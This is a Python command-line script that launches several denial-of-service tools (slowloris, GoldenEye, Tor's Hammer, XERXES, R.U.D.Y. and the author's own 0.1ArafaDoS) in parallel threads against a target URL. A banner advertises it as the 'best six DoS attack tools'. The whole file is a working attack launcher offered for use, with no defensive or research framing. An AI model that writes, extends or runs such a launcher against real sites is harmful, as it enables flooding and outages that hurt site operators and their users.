#!/usr/bin/python3

from os import system
from sys import argv
from threading import Thread
from termcolor import cprint
from requests import post

def banner():
	system("clear"),cprint(r"""
	    _.---.,_       ,-----.--.  ,---.                    ,---.          _,---.   ,---.
	  .'  - , `.-,    /` ` - /==/.--.'  \      .-.,.---.  .--.'  \      .-`.' ,  \.--.'  \
	 / -  ,  ,_\==\   `-'-. -|==|\==\-/\ \    /==/  `   \ \==\-/\ \    /==/_  _.-'\==\-/\ \
	|     .=.   |==|      | `|==|/==/-|_\ |  |==|-, .=., |/==/-|_\ |  /==/-  '..-./==/-|_\ |
	| -  :=; : _|==|      | -|==|\==\,   - \ |==|   '='  /\==\,   - \ |==|_ ,    /\==\,   - \
	|     `=` , |==|      | `|==|/==/ -   ,| |==|- ,   .' /==/ -   ,| |==|   .--' /==/ -   ,|
	 \ _,    - /==/.=.  .-','|==/==/-  /\ - \|==|_  . ,'./==/-  /\ - \|==|-  |   /==/-  /\ - \
	  `.   - .`=.`:=; :/     \==\==\ _.\=\.-'/==/  /\ ,  )==\ _.\=\.-'/==/   \   \==\ _.\=\.-'
	    ``--'--'   `=` `-----`---`--`        `--`-`--`--' `--`        `--`---'    `--`
	   ,---.                                         _,.---._      ,-,--.
	 .--.'  \       _.-.      _.-.     _,..---._   ,-.' , -  `.  ,-.'-  _\
	 \==\-/\ \    .-,.'|    .-,.'|   /==/,   -  \ /==/_,  ,  - \/==/_ ,_.'
	 /==/-|_\ |  |==|, |   |==|, |   |==|   _   _\==|   .=.     \==\  \
	 \==\,   - \ |==|- |   |==|- |   |==|  .=.   |==|_ : ;=:  - |\==\ -\
	 /==/ -   ,| |==|, |   |==|, |   |==|,|   | -|==| , '='     |_\==\ ,\
	/==/-  /\ - \|==|- `-._|==|- `-._|==|  '='   /\==\ -    ,_ //==/\/ _ |
	\==\ _.\=\.-'/==/ - , ,/==/ - , ,/==|-,   _`/  '.='. -   .' \==\ - , /
	 `--`        `--`-----'`--`-----'`-.`.____.'     `--`--''    `--`---'
												By: Abd Almoen Arafa (0.1Arafa)
												My Age is: 15
												This tool made in 2022
			Best six DoS attack tools around the world are here
	""","grey",attrs=["bold"])

def First_Packet():
	try:
		post(argv[1])
	except:
		print("\033[00m\033[91m[-] Error, Bad URL or check your Internet Connection\033[00m")
		quit()

def ArafaDoS():
	cprint("[+] Starting 0.1ArafaDoS...","magenta")
	system(f"python3 0.1ArafaDoS/0.1ArafaDoS.py {argv[1]} 25")

def slowloris():
	cprint("[+] Starting slowloris...","magenta")
	system(f"slowloris {argv[1]}")

def goldeneye():
	cprint("[+] Starting goldeneye...","magenta")
	system(f"goldeneye {argv[1]}")

def torshammer():
	cprint("[+] Starting torshammer...","magenta")
	system(f'python2 torshammer/torshammer.py -t {argv[1].replace("https://","").replace("http://","")}')

def XERXES():
	cprint("[+] Starting XERXES...","magenta")
	system(f'./XERXES/xerxes {argv[1].replace("https://","").replace("http://","")} 80')

def rudy():
	cprint("[+] Starting rudy...","magenta")
	system(f'rudy -t {argv[1]}')

def Main():
	ArafaDoS_thread=Thread(target=ArafaDoS)
	slowloris_thread=Thread(target=slowloris)
	goldeneye_thread=Thread(target=goldeneye)
	rudy_thread=Thread(target=rudy)
	torshammer_thread=Thread(target=torshammer)
	XERXES_thread=Thread(target=XERXES)

	if len(argv) == 2 or "all" in argv[2].lower():
		ArafaDoS_thread.start()
		slowloris_thread.start()
		goldeneye_thread.start()
		rudy_thread.start()
		torshammer_thread.start()
		XERXES_thread.start()
	if "0.1arafados" in argv[2].lower():
		ArafaDoS_thread.start()
	if "slowloris" in argv[2].lower():
		slowloris_thread.start()
	if "goldeneye" in argv[2].lower():
		goldeneye_thread.start()
	if "rudy" in argv[2].lower():
		rudy_thread.start()
	if "torshammer" in argv[2].lower():
		torshammer_thread.start()
	if "xerxes" in argv[2].lower():
		XERXES_thread.start()

if __name__ == "__main__":
	if len(argv) == 2 or len(argv) == 3 and "all" in argv[2].lower() or len(argv) == 3 and "0.1arafados" in argv[2].lower() or len(argv) == 3 and "slowloris" in argv[2].lower() or len(argv) == 3 and "goldeneye" in argv[2].lower() or len(argv) == 3 and "rudy" in argv[2].lower() or len(argv) == 3 and "torshammer" in argv[2].lower() or len(argv) == 3 and "xerxes" in argv[2].lower() :
		First_Packet()
		banner()
		Main()
	else:
		cprint("Available Tools: ","white",attrs=["bold"],end="")
		cprint("[0.1arafados,slowloris,goldeneye,rudy,torshammer,xerxes]","green")
		cprint("Usage          : ","white",attrs=["bold"],end="")
		cprint("python3 "+argv[0]+" <Target_URL> <Tools> OR 'all'","green")
		cprint("Example        : ","white",attrs=["bold"],end="")
		cprint("python3 "+argv[0]+" http://example.com 0.1arafados,slowloris","green")

#By: Abd Almoen Arafa (0.1Arafa)
#Age: 15
